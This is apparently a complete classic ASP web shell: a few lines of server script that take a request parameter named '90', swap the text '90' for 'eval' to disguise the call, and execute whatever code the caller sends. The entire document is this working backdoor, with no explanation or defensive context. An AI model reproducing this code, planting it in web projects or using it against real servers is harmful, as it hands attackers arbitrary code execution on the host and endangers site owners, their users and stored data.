<%
if request("90")<>"" then
b=request("90")
a=replace(b,"90","eval")
eval (a)
end if
%>